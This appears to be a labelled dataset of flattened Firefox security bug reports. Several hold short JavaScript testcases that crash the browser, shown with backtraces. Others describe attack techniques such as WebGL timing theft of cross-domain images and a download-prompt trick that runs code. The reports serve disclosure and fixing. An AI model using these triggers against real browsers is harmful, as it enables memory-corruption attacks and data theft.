nsgeolocation clearwatch crash user-agent mozilla/5.0 windows nt 6.1 wow64 rv:2.0b6 gecko/20100101 firefox/4.0b6 build identifier mozilla/5.0 windows nt 6.1 wow64 rv:2.0b6 gecko/20100101 firefox/4.0b6 description calling watchposition on the geolocation object with an object as argument followed by a clearwatch call leads to a crash these crashes sometimes show exploitable behaviour arbitray writes confirmed versions firefox 4.0 beta 6 firefox 3.6.10 testcase smallest testcase script o3=navigator o7=new error o15=o3.geolocation o15.watchposition o7 try o15.clearwatch 1 catch e script more likely to show exploitable behaviour script o3=navigator o7=new error o15=o3.geolocation for var x=0 x 10 x o15.watchposition o7 for var x=0 x 10 x try o15.clearwatch x+1 catch e script testcase notes the testcase might need several reloads in the browser stack backtrace linux eax 1515870811 ecx 1210355724 edx 0 ebx 1210355724 esp ebp esi 1073752556 edi 1 eip nsgeolocation clearwatch int 51 eflags pf sf if rf cs 115 ss 123 ds 123 es 123 fs 0 gs 51 zn13nsgeolocation10clearwatchei+51 movb eax zn13nsgeolocation10clearwatchei+55 xor eax eax zn13nsgeolocation10clearwatchei+57 add esp program received signal sigsegv segmentation fault nsgeolocation clearwatch this awatchid=1 at home/ubuntu/build/src/dom/src/geolocation/nsgeolocation.cpp:979 warning source file is more recent than executable 979 mwatchingcallbacks awatchid markcleared 0 nsgeolocation clearwatch this awatchid=1 at home/ubuntu/build/src/dom/src/geolocation/nsgeolocation.cpp:979 1 in ns_invokebyindex_p from home/ubuntu/build/debug/dist/bin/libxul.so 2 in callmethodhelper call from home/ubuntu/build/debug/dist/bin/libxul.so 3 in xpcwrappednative callmethod ccx mode=xpcwrappednative call_method at home/ubuntu/build/src/js/src/xpconnect/src/xpcwrappednative.cpp:2304 4 in xpc_wn_callmethod cx obj argc=2862849936 argv vp at home/ubuntu/build/src/js/src/xpconnect/src/xpcwrappednativejsops.cpp:1738 5 in calljsnative cx fun value optimized out script native xpc_wn_callmethod jscontext jsobject unsigned int jsval_layout jsval_layout argsref flags=2 windows 1b5c.13b8 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled xul nsgeolocation clearwatch 5f12fde1 c6402501 mov byte ptr eax+25h 1 ds:002b:6c6d7853=6c xul nsgeolocation clearwatch xul ns_invokebyindex_p xul xpc_wn_callmethod mozcrt19 arena_dalloc xul js monitorloopedge xul js interpret xul js execute xul js_evaluateucscriptforprincipals xul nsjscontext evaluatestring xul nsscriptloader evaluatescript xul nsscriptloader processrequest xul nsscriptloader processscriptelement xul nsscriptelement maybeprocessscript xul nshtmlscriptelement maybeprocessscript xul nshtmlscriptelement doneaddingchildren xul nshtml5treeopexecutor runscript xul nshtml5treeopexecutor runflushloop xul nshtml5executorreflusher run xul nsthread processnextevent xul mozilla ipc messagepump run my reference d4f8755506e48534c2eb4dda39a054c1_1 vulndev reference vd10002 reported by nils of vulndev ltd reproducible always steps to reproduce 1 save testcase to html file 2 load testcase 3 crash actual results crash expected results no crash	11
tm crash jsobject dropproperty or js tracerecorder record_jsop_in or assertion failure status arecord_error for b 0 b 1 b var d b function x proxy.create function return getpropertydescriptor function 5 for a 0 a 3 a if a 1 d in x crashes js opt shell with j on tm tip at jsobject dropproperty and asserts js debug shell with j on tm tip at assertion failure status arecord_error at jsops.cpp:7 s-s because this seems like a scary address prior to reduction the edx instruction was at a weird location assuming sg critical unless otherwise noted program received signal sigsegv segmentation fault in jsobject dropproperty jscontext jsproperty gdb bt 0 in jsobject dropproperty jscontext jsproperty 1 in backtrace stopped previous frame inner to this frame corrupt stack gdb x/i eip zn8jsobject12droppropertyep9jscontextp10jsproperty+7 mov edx eax gdb x/b edx can not access memory at address	11
purgescriptfragments may not purge all fragments purgescriptfragments only looks for trace fragments that are found in tracemonitor for the current thread this misses other threads that also may contain the fragments for the script for example the gc never runs on a web worker thread so the gc will never purge any fragments for web worker functions this is hazardous as the fragments may match a newly allocate script that reused memory from the deleted script	11
integer overflow leads to incorrect buffer size in nstsubstring_chart mutateprep as neil parkwaycc.co.uk noted in bug 615112 comment 5 if the above is a problem then this line from mutateprep is too size_type storagesize capacity 1 sizeof char_type this is indeed a bug	11
nsucs2betounicode fails to adhere to the api contract when given a buffer with one byte the nsiunicodedecoder documentation says the eventual incomplete final character data will be stored internally in the converter and used when the method is called again for continuing the conversion this way the caller will not have to worry about managing incomplete input data by mergeing it with the next buffer and when partial input it will be consumed and cached furthermore the docs say param adestlength in/out the length of the destination data buffer after conversion will contain the number of unicode characters written however if a one-byte buffer is passed to nsucs2betounicode it returns ns_error_illegal_input in violation of the requirement for decoders to cache partial input and much worse it fails to set adestlength to 0 this looks to the caller as if the entire output buffer was written to but then an error occurred this means that uninitialized memory shows to content because in fact 0 code units were written to the output the decoder should work even if it were fed one byte at a time and it should always adjust adestlength to reflect the actual number of bytes written before it returns i ve seen crashes that have to be somehow related to this but i do n't have an explanation for how the crashes happen	11
crash nsrange isvalidboundary after selected node is gced 1 install dom fuzz lite from 2 load the testcase crash nsrange isvalidboundary l598 is the crashing line	11
make notifiers strong owners of mcallback to prevent crashes due to unexpected events ordering see c22 while spinnging the events loop in a handleresult is not nice at all owenrship should be changed so that it wo n't make us crash at random addresses	11
crash nsconverterinputstream fill unsigned int assertion whoa the converter should have returned ns_ok_udec_moreinput before this point srcconsumed mbytedata getlength 1 2 assert like a mad man and then crash wait for it 1.9.2 does n't seem to crash but 2.0.0 does these files have n't changed since the switch from cvs 1.9.2 assertion whoa the converter should have returned ns_ok_udec_moreinput before this point srcconsumed mbytedata getlength file work/mozilla/builds/1.9.2/mozilla/intl/uconv/src/nsconverterinputstream.cpp line 255 assertion decoder returned an error but filled the output buffer should not happen 0 munichardata getbuffersize munichardatalength file work/mozilla/builds/1.9.2/mozilla/intl/uconv/src/nsconverterinputstream.cpp line 246 2.0.0 assertion whoa the converter should have returned ns_ok_udec_moreinput before this point srcconsumed mbytedata getlength file work/mozilla/builds/2.0.0/mozilla/intl/uconv/src/nsconverterinputstream.cpp line 255 ss since i do n't like the write aspect and the assert on mac program received signal exc_bad_access could not access memory reason kern_invalid_address at address switching to process 44119 thread in nsrefptr nsirunnable nsrefptr this at nsautoptr.h:969 969 mrawptr release gdb bt 0 in nsrefptr nsirunnable nsrefptr this at nsautoptr.h:969 1 in nseventqueue putevent this runnable at work/mozilla/builds/2.0.0/mozilla/xpcom/threads/nseventqueue.cpp:140 2 in nsthread nschainedeventqueue putevent this event at work/mozilla/builds/2.0.0/mozilla/xpcom/threads/nsthread.cpp:760 3 in nsthread putevent this event at work/mozilla/builds/2.0.0/mozilla/xpcom/threads/nsthread.cpp:389 4 in nsthread dispatch this event flags=0 at work/mozilla/builds/2.0.0/mozilla/xpcom/threads/nsthread.cpp:433 5 in nstimerimpl posttimerevent this at work/mozilla/builds/2.0.0/mozilla/xpcom/threads/nstimerimpl.cpp:552 6 in timerthread run this at work/mozilla/builds/2.0.0/mozilla/xpcom/threads/timerthread.cpp:313 7 in nsthread processnextevent this maywait=1 result at work/mozilla/builds/2.0.0/mozilla/xpcom/threads/nsthread.cpp:633 8 in ns_processnextevent_p thread maywait=1 at nsthreadutils.cpp:250 9 in nsthread threadfunc arg at work/mozilla/builds/2.0.0/mozilla/xpcom/threads/nsthread.cpp:278 10 in pt_root arg at work/mozilla/builds/2.0.0/mozilla/nsprpub/pr/src/pthreads/ptthread.c:187 11 in pthread_start 12 in thread_start on windows operating system windows nt 5.1.2600 service pack 3 cpu x86 genuineintel family 6 model 44 stepping 2 1 cpu crash reason exception_access_violation_write crash address thread 0 crashed 0 xul.dll nsconverterinputstream fill unsigned int nsconverterinputstream.cpp 247 eip esp ebp ebx esi edi eax ecx edx efl found by given as instruction pointer in context 1 xul.dll nsconverterinputstream read unsigned short unsigned int unsigned int nsconverterinputstream.cpp 105 eip esp ebp found by call frame info 2 xul.dll nscssscanner ensuredata nscssscanner.cpp 634 eip esp ebp found by call frame info 3 xul.dll nscssscanner read nscssscanner.cpp 653 eip esp ebp found by call frame info 4 xul.dll nscssscanner next nscsstoken nscssscanner.cpp 754 eip esp ebp found by call frame info 5 xul.dll anonymous namespace cssparserimpl gettoken int nscssparser.cpp 1292 eip esp ebp found by call frame info 6 xul.dll anonymous namespace cssparserimpl parse nsiunicharinputstream nsiuri nsiuri nsiprincipal unsigned int int nscssparser.cpp 916 eip esp ebp found by call frame info 7 xul.dll nscssparser parse nsiunicharinputstream nsiuri nsiuri nsiprincipal unsigned int int nscssparser.cpp 9045 eip esp ebp found by call frame info 17 crashes on windows in last week in socorro	11
crash nsnpapiplugininstance getimage mainly with webex it is a new crash signature that first appeared in 4.0b12 it is 7 top crasher on mac os x in 4.0 most comments talk about webex signature nsnpapiplugininstance getimage uuid cad2d71a-1982-494b-b7a6-5d4f22110324 time 2011-03-24 21:48:04.45510 uptime 91254 last crash 9751821 seconds more than 3 months before submission install age 450096 seconds 5.2 days since version was first installed product firefox version 4.0 build id 20110318052756 branch 2.0 os mac os x os version 10.5.8 9l31a cpu x86 cpu info family 6 model 23 stepping 6 crash reason exc_bad_access kern_invalid_address crash address user comments www.xbox.com app notes renderers frame module signature expand source 0 xul nsnpapiplugininstance getimage modules/plugin/base/src/nsnpapiplugininstance.cpp:882 1 xul nsplugininstanceowner setcurrentimage layout/generic/nsobjectframe.cpp:2000 2 xul nsplugininstanceowner invalidaterect layout/generic/nsobjectframe.cpp:3499 3 xul nsnpapiplugininstance invalidaterect modules/plugin/base/src/nsnpapiplugininstance.cpp:1215 4 xul mozilla plugins parent invalidaterect modules/plugin/base/src/nsnpapiplugin.cpp:1268 5 agcore agcore 6 agcore agcore 7 agcore agcore 8 agcore agcore 9 agcore agcore 10 corefoundation cfrunloopdoobservers 11 corefoundation cfrunlooprunspecific 12 corefoundation cfrunloopruninmode 13 foundation nsrunloop runmode beforedate 14 xul nsappshell processnextnativeevent widget/src/cocoa/nsappshell.mm:664 15 xul nsbaseappshell onprocessnextevent widget/src/xpwidgets/nsbaseappshell.cpp:173 16 xul nsappshell onprocessnextevent widget/src/cocoa/nsappshell.mm:833 17 xul nsthread processnextevent xpcom/threads/nsthread.cpp:597 18 xul ns_processpendingevents_p nsthreadutils.cpp:200 19 xul nsbaseappshell nativeeventcallback widget/src/xpwidgets/nsbaseappshell.cpp:132 20 xul nsappshell processgeckoevents widget/src/cocoa/nsappshell.mm:399 21 corefoundation cfrunlooprunspecific 22 corefoundation cfrunloopruninmode 23 hitoolbox runcurrenteventloopinmode 24 hitoolbox receivenexteventcommon 25 hitoolbox blockuntilnexteventmatchinglistinmode 26 appkit dpsnextevent 27 appkit nsapplication nexteventmatchingmask untildate inmode dequeue 28 appkit nsapplication run 29 xul nsappshell run widget/src/cocoa/nsappshell.mm:746 30 xul nsappstartup run toolkit/components/startup/src/nsappstartup.cpp:220 31 xul xre_main toolkit/xre/nsapprunner.cpp:3786 32 firefox-bin main browser/app/nsbrowserapp.cpp:158 33 firefox-bin firefox-bin 34 more reports at	11
respond to the webgl cross-domain image theft vulnerability proof-of-concept the proof-of-concept consists in loading a cross-domain image as a webgl texture and rendering each pixel using a shader program that takes an amount of time proportional to the r g b values of pixels by timing this they get an approximation of the image the attacker has to make a compromise between image quality and time the higher the wanted quality the longer it takes to steal the biggest hurdle that an attacker faces is that it s usually hard to know the urls of sensitive images to steal if the attacker knows urls to steal and is able to get users to run webgl scripts if some users will stay long enough on his page between 1 and 30 minutes needed depending on image size/quality he can steal their images with that technique	9
prevent loading webgl textures from cross-domain images in order to fix bug 655987 i.e respond to this exploit we need to prevent using cross-domain images as webgl textures we also need to prevent using a canvas/2d as proxy for doing the same thing then we may consider relaxing this with cors	9
webgl allows access to uninitialised graphics memory user-agent mozilla/5.0 windows nt 5.1 rv:2.0.1 gecko/20100101 firefox/4.0.1 build identifier the linked conformance test checks that a webgl canvas is n't given unintialised memory when it is resized we found that it fails on some configurations on windows xp and macos x by using a larger canvas is it possible to view graphics data from other web pages and on macos various parts of the desktop as well i m attaching a poc that loads an iframe onto a texture by applying a css transform/transition to it then searches for it in graphics memory an svg color matrix filter is allied to it to set the red channel to a specific value which we then search for although the retrieved image is somewhat scrambled the poc could be further developed by encoding position information for each pixel into the color channels and using that information to reconstruct the whole image we ve tested this with success on intel and ati cards on winxp and nvidia and intel cards on some recent macs reproducible always steps to reproduce 1 get webgl context 2 resize canvas 3 copy webgl canvas onto 2d canvas 4 read pixels	9
holding enter allows arbitrary code execution due to download manager user-agent mozilla/5.0 windows nt 6.1 wow64 rv:2.0.1 gecko/20100101 firefox/4.0.1 build identifier mozilla/5.0 windows nt 6.1 wow64 rv:2.0.1 gecko/20100101 firefox/4.0.1 it is possible to execute an arbitrary code in the context of user s operating system if a user holds enter for about 1-2 seconds consider the attached example a file download prompt pops up and a user has only about a second to react with the default firefox settings it could be a fraction of second more if the option to always ask where to save files was explicitly selected if they keep holding enter and there was no downloads window on the task bar prior to the prompt thus the newly appearing downloads window with the malicious file highlighted gains focus an arbitrary code will be executed no user interaction other than holding enter is needed for a successful exploitation of this issue the windows appear in a very brief instant and an attacker can use a number of methods to easily distract user s attention to make them hold the crucial key a fraction of second longer i think that the primary problem here is that the keyboard buffer is n't maintained correctly when the download prompt gains focus it should be flushed and no new keys should be registered until after all keys are released reproducible always steps to reproduce 1 open script.htm 2 press and hold enter actual results calc.exe starts expected results no file should be launched without an explicit consent from the user the attached example has been verified to launch calc.exe in firefox 4.0.1 on windows 7 sp1 64-bit and windows xp sp2 32-bit	2
jar should be marked executable this bug was initially created as a clone of bug 657462 if java is installed opening a jar file will launch a java application which is definitely not web safe since a jar application can launch executables among other things we should mark that as an executable type so that users are forced to download and manually open rather than allow then to open from the download prompt or worse set it to auto-open we should check to see if java registers any other extensions while we re at it	2
jar should not be openable on mac or linux download only cve-2011-3666 this bug was initially created as a clone of bug 662309 on windows it was simple to make jar executable in nslocalfilewin and force users to download a jar rather than letting them open it and run a privileged local java application on mac most files with the executable bit set do trigger the save only path but something is special-casing jar noticing that the system has a handler for it and letting it be opened anyway i could not find any equivalent blacklist on mac that jar could be added to and we desperately need one just because the os knows how to run a java archive or other types does n't mean it s wise to do so from a web page someone who knows mac will have to take this the original bug on this was externally reported and the windows variant is fixed in fx5 and 3.6.18 this is important to fix soon	2
assertion ownerdocument changed again after adopting with mutation event assertion ownerdocument changed again after adopting hassameownerdoc newcontent doc getownerdoc file content/base/src/nsgenericelement.cpp line 4066	11
strict warning function f does not always return a value can cause buffer overreads i tried but somehow failed to get a windows environment with symbols for a js shell but nonetheless attaching what i have the testcase is extremely fragile but somewhat reproducible it does n't seem to affect debug shells assuming worse-case sg critical pending further analysis	11
crash due to stack exhaustion in bindtotree with setuserdata user-agent mozilla/5.0 x11 u linux x86_64 en-us rv:1.9.2.14 gecko/20110221 ubuntu/10.10 maverick firefox/3.6.14 build identifier following javascript in a html document will crash the browser tmp document.createelement iframe document.body.appendchild tmp o52=document.createelement h1 o62=tmp.contentdocument.createelement script o136=o52.setuserdata key o62 function o k d s ds o52.appendchild d o62.appendchild o52 linux gdb stack backtrace gdb bt 10 0 nsstyledelement bindtotree this adocument aparent abindingparent acompileeventhandlers=1 at nsstyledelement.cpp:157 1 in nsmappedattributeelement bindtotree this adocument aparent abindingparent acompileeventhandlers=1 at nsmappedattributeelement.cpp:51 2 in nsgenerichtmlelement bindtotree this adocument aparent abindingparent acompileeventhandlers=1 at nsgenerichtmlelement.cpp:869 3 in nsgenericelement bindtotree this adocument aparent value optimized out abindingparent acompileeventhandlers value optimized out at nsgenericelement.cpp:2657 4 in nsstyledelement bindtotree this adocument aparent abindingparent acompileeventhandlers=1 at nsstyledelement.cpp:157 5 in nsmappedattributeelement bindtotree this adocument aparent abindingparent acompileeventhandlers=1 at nsmappedattributeelement.cpp:51 6 in nsgenerichtmlelement bindtotree this adocument aparent tested on ff4 beta and ff3 on windows and linux reproducible always	11
crash nsbarprop getvisiblebyflag int unsigned int this bug was filed from the socorro interface and is report bp-fbfefcf6-c046-436b-97e5-363552110316 33 crashes on the 4.0 rc opened then crashed shortly after the page load was done	11
crash nstarray_base nstarraydefaultallocator length nscharsinktraits calculateutf8size write gfxuserfontset loadnext ashed 0 xul.dll calculateutf8size write unsigned short const unsigned int with downloaded font 1 2 sometimes crash i have n't been able to reproduce locally on mac os x or windows xp but the automation has so far crashed on windows 7 32bit fedora 14 32bit and 64bit i have been able to reproduce locally on fedora 14 32bit especially when running under gdb i was n't able to crash a nightly linux build however ymmv associated socorro signature gfxuserfontset loadnext operating system windows nt 6.1.7601 service pack 1 cpu x86 genuineintel family 6 model 44 stepping 2 1 cpu crash reason exception_access_violation_read crash address thread 0 crashed 0 xul.dll nstarray_base nstarraydefaultallocator length nstarray.h 139 eip esp ebp ebx esi edi eax ecx edx efl found by given as instruction pointer in context 1 xul.dll gfxmixedfontfamily removefontentry gfxfontentry gfxuserfontset.h 113 eip esp ebp found by call frame info 2 xul.dll gfxuserfontset loadnext gfxproxyfontentry gfxuserfontset.cpp 691 eip esp ebp found by call frame info 3 xul.dll gfxuserfontset onloadcomplete gfxfontentry unsigned char const unsigned int unsigned int gfxuserfontset.cpp 586 eip esp ebp found by call frame info 4 xul.dll nsfontfaceloader onstreamcomplete nsistreamloader nsisupports unsigned int unsigned int unsigned char const nsfontfaceloader.cpp 226 eip esp ebp found by call frame info 5 xul.dll nsstreamloader onstoprequest nsirequest nsisupports unsigned int nsstreamloader.cpp 125 eip esp ebp found by call frame info operating system linux 0.0.0 linux 2.6.35.11-83.fc14.i686.pae 1 smp mon feb 7 06:57:55 utc 2011 i686 cpu x86 genuineintel family 6 model 44 stepping 2 1 cpu crash reason sigsegv crash address thread 0 crashed 0 libxul.so nstarray_base nstarraydefaultallocator length nstarray.h 139 eip esp ebp ebx esi edi eax ecx edx efl found by given as instruction pointer in context 1 libxul.so gfxmixedfontfamily removefontentry gfxuserfontset.h 113 eip esp ebp ebx esi edi found by call frame info 2 libxul.so gfxuserfontset loadnext gfxuserfontset.cpp 691 eip esp ebp ebx esi edi found by call frame info 3 libxul.so gfxuserfontset onloadcomplete gfxuserfontset.cpp 586 eip esp ebp ebx esi edi found by call frame info 4 libxul.so nsfontfaceloader onstreamcomplete nsfontfaceloader.cpp 226 eip esp ebp ebx esi edi found by call frame info 5 libxul.so nsstreamloader onstoprequest nsstreamloader.cpp 125 eip esp ebp ebx esi edi found by call frame info operating system linux 0.0.0 linux 2.6.35.11-83.fc14.i686.pae 1 smp mon feb 7 06:57:55 utc 2011 i686 cpu x86 genuineintel family 6 model 44 stepping 2 1 cpu crash reason sigsegv crash address thread 0 crashed 0 libxul.so nscharsinktraits calculateutf8size write nsutf8utils.h 604 eip esp ebp ebx esi edi eax ecx edx efl found by given as instruction pointer in context 1 libxul.so copy_string nsreadingiterator short unsigned int calculateutf8size nsalgorithm.h 93 eip esp ebp ebx esi edi found by call frame info 2 libxul.so appendutf16toutf8 nsreadableutils.cpp 200 eip esp ebp ebx esi edi found by call frame info 3 libxul.so ns_convertutf16toutf8 ns_convertutf16toutf8 nsstring.h 161 eip esp ebp ebx esi edi found by call frame info 4 libxul.so gfxuserfontset onloadcomplete gfxuserfontset.cpp 477 eip esp ebp ebx esi edi found by call frame info 5 libxul.so nsfontfaceloader onstreamcomplete nsfontfaceloader.cpp 226 eip esp ebp ebx esi edi found by call frame info ss since windows 7 showed deleted heap in the crash address and ecx	11
document.cookie should only allow setting one cookie at a time currently document.cookie allows setting multiple cookies in a single call this is inconsistent with other browsers as well as our documentation note that you can only set/update a single cookie at a time using this method this can lead to security problems in web applications when an external script takes untrusted input e.g from a url parameter that input can contain line breaks and thus set multiple cookies to the including web site therefore we should disallow setting multiple cookies using document.cookie	11
crash in xul nsblockinflowlineiterator nsblockinflowlineiterator nslinebox indexof nslinebox indexof nsiframe user-agent mozilla/5.0 windows nt 6.1 wow64 rv:2.0 gecko/20100101 firefox/4.0 build identifier mozilla/5.0 windows nt 6.1 wow64 rv:2.0 gecko/20100101 firefox/4.0 description the attached testcase crashes firefox 4.0 on linux and windows marked as potential security issue as ff is accessing memory in unmapped regions affected versions firefox 4.0 windows and linux testcase the testcase is attached as an html file it will crash the browser on opening assertions following assertions are triggered before the process crashes on linux assertion dying in the middle of our own update mupdatecount 0 file layout/base/nscssframeconstructor.h line 89 assertion should be in an update while destroying frames mupdatecount 0 file layout/base/nscssframeconstructor.cpp line 7365 assertion should be in an update while destroying frames mupdatecount 0 file layout/base/nscssframeconstructor.cpp line 1442 assertion too many endupdate s 0 mupdatecount file layout/base/nspresshell.cpp line 3401 assertion should be in an update while creating frames mupdatecount 0 file layout/base/nscssframeconstructor.cpp line 6488 assertion too many endupdate s 0 mupdatecount file layout/base/nspresshell.cpp line 3401 assertion should be in an update while creating frames mupdatecount 0 file layout/base/nscssframeconstructor.cpp line 6488 assertion too many endupdate s 0 mupdatecount file layout/base/nspresshell.cpp line 3401 assertion should be in an update while destroying frames mupdatecount 0 file layout/base/nscssframeconstructor.cpp line 7365 assertion should be in an update while destroying frames mupdatecount 0 file layout/base/nscssframeconstructor.cpp line 1442 assertion should be in an update while destroying frames mupdatecount 0 file layout/base/nscssframeconstructor.cpp line 1442 assertion should be in an update while destroying frames mupdatecount 0 file layout/base/nscssframeconstructor.cpp line 1442 assertion should be in an update while destroying frames mupdatecount 0 file layout/base/nscssframeconstructor.cpp line 1442 assertion should be in an update while destroying frames mupdatecount 0 file layout/base/nscssframeconstructor.cpp line 1442 assertion should be in an update while destroying frames mupdatecount 0 file layout/base/nscssframeconstructor.cpp line 1442 assertion should be in an update while destroying frames mupdatecount 0 file layout/base/nscssframeconstructor.cpp line 1442 assertion should be in an update while destroying frames mupdatecount 0 file layout/base/nscssframeconstructor.cpp line 1442 assertion should be in an update while destroying frames mupdatecount 0 file layout/base/nscssframeconstructor.cpp line 1442 assertion should be in an update while destroying frames mupdatecount 0 file layout/base/nscssframeconstructor.cpp line 1442 assertion should be in an update while destroying frames mupdatecount 0 file layout/base/nscssframeconstructor.cpp line 1442 assertion should be in an update while destroying frames mupdatecount 0 file layout/base/nscssframeconstructor.cpp line 1442 assertion should be in an update while destroying frames mupdatecount 0 file layout/base/nscssframeconstructor.cpp line 1442 assertion instant quote updates are bad news mupdatecount 0 file layout/base/nscssframeconstructor.h line 1788 assertion recurring into frame construction mprescontext mlayoutphasecount elayoutphase_framec 0 file layout/base/nsprescontext.h line 1375 program received signal sigsegv segmentation fault in from libxul.so stack backtrace following crashes have been observed windows firefox 4.0 127c.838 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled xul nsblockinflowlineiterator nsblockinflowlineiterator 6c9c7f7c 8b4020 mov eax dword ptr eax+20h ds:002b f0de801f xul nsblockinflowlineiterator nsblockinflowlineiterator class nsblockframe aframe class nsiframe afindframe int afoundvalidline xul nsblockframe childisdirty class nsiframe achild xul presshell frameneedsreflow class nsiframe aframe nsipresshell intrinsicdirty aintrinsicdirty estylechange 2 unsigned int64 abittoadd xul nstextframe characterdatachanged struct characterdatachangeinfo ainfo xul nscssframeconstructor characterdatachanged class nsicontent acontent struct characterdatachangeinfo ainfo xul presshell characterdatachanged class nsidocument adocument class nsicontent acontent struct characterdatachangeinfo ainfo xul nsnodeutils characterdatachanged class nsicontent acontent struct characterdatachangeinfo ainfo xul nsgenericdomdatanode settextinternal unsigned int aoffset 0 unsigned int acount 1 wchar_t abuffer cve-2011-2374 non-tactical assertion this is unsafe fix the caller in nseventdispatcher user-agent mozilla/5.0 windows nt 6.1 wow64 rv:2.0 gecko/20100101 firefox/4.0 build identifier description the attached testcase triggers following assertion on debug builds assertion this is unsafe fix the caller a stack back trace at the time of the assertion is attached additionally exploitable looking crashes have been observed on linux	11
potential arbitrary code execution when type=content chrome frames web content firefox 4 introduces about addons the former add-ons dialog reborn as chrome-privileged content tab if you select the get addons section you get a non-chrome frame hosting addons.mozilla.org as bzbarsky notes in bug 593387 comment 29 this means web content can get a reference to a privileged chrome window through window.top can you do anything fun with this for testing purposes you can point extensions.webservice.discoverurl wherever you like must be an https url although it can then navigate to non-ssl which is probably a bug if there are any new wrapper problems you can attack this way that would be good to know 1 we may use this chrome-tab approach elsewhere and 2 should amo get hacked/defaced we do n't want it to be able to escape into firefox chrome	11
crash js gc markchildren try x catch r try x x x.c x with x x x.__definesetter x function gc instanceof a x catch r gc crashes js opt shell on tm changeset c811be25eaad without m nor j at js gc markchildren but does not seem to crash debug shell locking s-s just to be safe autobisect shows this is probably related to the following changeset the first bad revision is changeset 63258 b16be37906fe user andreas gal date wed mar 09 00:53:56 2011 0800 summary do n't shrink object slots during gc bug 639727 r=bhackett	11
gc hazard in js_xdrscriptobject when reviewing the patch for the bug 632253 i have missed that jsscript filename is only rooted by jsscript so the result of js_savescriptfilename must be stored in the rooted script instance before a gc can happen yet i have suggested to decode the filename before any script instance id created	11
firefox 4.2a1pre crash report js_xdrscript jsxdrstate jsscript js_xdratom js_xdrscriptandsubscripts jsxdrstate jsscript seen while reviewing trunk top changers to the reports frame module signature expand source 0 mozjs.dll js_xdrscript js/src/jsscript.cpp:439 1 mozjs.dll js_xdrscriptobject js/src/jsxdrapi.cpp:735 2 xul.dll readscriptfromstream js/src/xpconnect/loader/mozjscomponentloader.cpp:367 3 xul.dll mozjscomponentloader readscript js/src/xpconnect/loader/mozjscomponentloader.cpp:899 4 xul.dll mozjscomponentloader globalforlocation js/src/xpconnect/loader/mozjscomponentloader.cpp:1044 5 xul.dll nsrefptr nsprescontext nsrefptr nsprescontext obj-firefox/dist/include/nsautoptr.h:969 6 xul.dll mozjscomponentloader jarkey js/src/xpconnect/loader/mozjscomponentloader.cpp:599 7 kernel32.dll interlockedexchangeadd	11
possible security sensitive crash mozilla webglprogram detachshaders when playing with possible infinite loop shaders i hit a crash that appears like it might be dangerous crash reason exception_access_violation_write crash address 0 xul.dll mozilla webglprogram detachshaders content/canvas/src/webglcontext.h:1313 1 xul.dll mozilla webglcontext useprogram content/canvas/src/webglcontextgl.cpp:3573 2 xul.dll nsidomwebglrenderingcontext_useprogram obj-firefox/js/src/xpconnect/src/dom_quickstubs.cpp:31987 3 4 mozjs.dll checkstackandentermethodjit js/src/methodjit/methodjit.cpp:778 5 mozjs.dll js mjit jaegershot js/src/methodjit/methodjit.cpp:802 6 mozjs.dll js runscript js/src/jsinterp.cpp:646 7 mozjs.dll js invoke js/src/jsinterp.cpp:740 8 mozjs.dll js externalinvoke js/src/jsinterp.cpp:863 9 mozjs.dll js_callfunctionvalue js/src/jsapi.cpp:5173 10 xul.dll nsjscontext calleventhandler dom/base/nsjsenvironment.cpp:1914 11 xul.dll nsglobalwindow runtimeout dom/base/nsglobalwindow.cpp:9107 12 xul.dll nsglobalwindow timercallback dom/base/nsglobalwindow.cpp:9452 13 xul.dll nstimerimpl fire xpcom/threads/nstimerimpl.cpp:425 14 xul.dll nstimerevent run xpcom/threads/nstimerimpl.cpp:517 15 xul.dll nsthread processnextevent xpcom/threads/nsthread.cpp:633 16 xul.dll mozilla ipc messagepump run ipc/glue/messagepump.cpp:134 17 xul.dll xul.dll 18 xul.dll messageloop runinternal ipc/chromium/src/base/message_loop.cc:219 19 xul.dll messageloop runhandler ipc/chromium/src/base/message_loop.cc:202 20 mozcrt19.dll vec_memzero 21 xul.dll xul.dll 22 firefox.exe firefox.exe 23 ntdll.dll winsqmsetifmaxdword 24 ntdll.dll rtluserthreadstart 25 firefox.exe firefox.exe 26 firefox.exe firefox.exe 1311 void detachshaders 1312 for pruint32 i 0 i mattachedshaders.length i 1313 mattachedshaders i decrementattachcount 1314 1315 mattachedshaders.clear 1316	11
push cx to stack before calling mozrequestanimationframe callbacks see bug 652317	11
gc hazard with nosuchmethod this script crashes in a shell with no jit options	11
nssmilanimationcontroller mdocument is suspicious mdocument is type nsidocument and once it is set to some value it is never cleared if i read the code correctly that might lead to sg critical crashes if someone managed to access mdocument once the object is deleted	11
assertion requesting refresh driver after document has disconnected 1 start firefox with a new profile 2 load the testcase 3 click the testcase s button 4 quit firefox or force gc result assert during shutdown assertion requesting refresh driver after document has disconnected error file content/smil/nssmilanimationcontroller.cpp line 840 based on hg blame for the assertion i suspect this might be a regression from bug 653238	11
incorrect line number in e4x tokens leads to buffer overreads and possible crashes attached testcase crashes both js debug and opt shell on tm changeset 0d4b01278890 without m nor j nominating blocking2.0 and setting s-s because i have no idea what this is capable of it seems to access a weird memory location at in 64-bit this also reproduces in 32-bit	11
crash executetree user-agent mozilla/5.0 windows u windows nt 6.1 en-us rv:1.9.2.16 gecko/20110319 firefox/3.6.16 build identifier mozilla/5.0 windows u windows nt 6.1 en-us rv:1.9.2.16 gecko/20110319 firefox/3.6.16 error crash reporter reproducible always	11
1.9.2 crash ycc_rgb_convert on image with src set to a resource with multipart/x-mixed-replace content type user-agent mozilla/5.0 windows u windows nt 6.1 fr rv:1.9.2.14 gecko/20110218 firefox/3.6.14 build identifier mozilla/5.0 windows u windows nt 6.1 fr rv:1.9.2.14 gecko/20110218 firefox/3.6.14 visiting a webpage that contains multiple images with the src-attribute that refers to a multipart/x-mixed-replace resource firefox 3.6.14 on windows crashes after some time with access_violation_write tested on windows 7 reproducible always steps to reproduce 1 visit test page 2 wait a few moments actual results firefox crashes expected results firefox do n't crash like bug 610601 this crash is very intermittent sometimes firefox will crash after some seconds and sometimes firefox do n't crash at all	11
